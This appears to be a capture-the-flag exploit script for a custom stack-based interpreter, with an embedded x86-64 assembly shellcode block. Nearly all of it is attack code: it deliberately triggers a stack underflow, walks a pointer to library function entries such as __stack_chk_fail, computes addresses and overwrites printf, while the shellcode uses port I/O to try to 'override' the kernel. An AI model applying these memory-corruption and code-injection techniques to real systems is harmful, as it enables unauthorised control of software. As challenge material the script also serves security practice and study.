# Stack = 0x2020A0
# 

0 # padding
ASM
  mov edi, 1 # Write
  lea rsi, [rip + prompt]
  mov edx, promptend - prompt
  mov eax, 1
  syscall

  mov ecx, eax
  cmp ecx, 0
  jl exit

  # Override our kernel
  mov dx, 0x8001 # read
  mov eax, 0x4010 # 0x4010 has 0, 0, size
  out dx, eax
  in eax, dx

  syscall
  jmp exit
  hlt

root: # I should be in kernel mode
  mov edi, 23
  jmp exit

prompt:
  .string "Please enter code to override kernel with:"
promptend:
exit:
  mov dx, 0x8006
  mov eax, edi
  out dx, eax
ENDASM  
pop

# Okay cause stack underflow
1
neg
swap # cause a stack underflow, and swap with stack ptr
pop
pop

# Store the pointer to stdin
#writed
#writed
0
store
1
store

# Note that stdin is now clobbered!
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
# Now our pointer is at __ctype_b_loc
pop
pop
pop
pop
pop
pop
pop
pop
# Pointer is at __stack_chk_fail with offset 0x7b6
2 # HI
store
3 # LO
store

# Calculate stack: LO + 0x2020a8 - 0x7b6
3
fetch
2103538
add
3
store

# Move pointer to printf
0
0
0
0
# Override printf
3
2
fetch
pop
fetch
writed

#writed
#writed
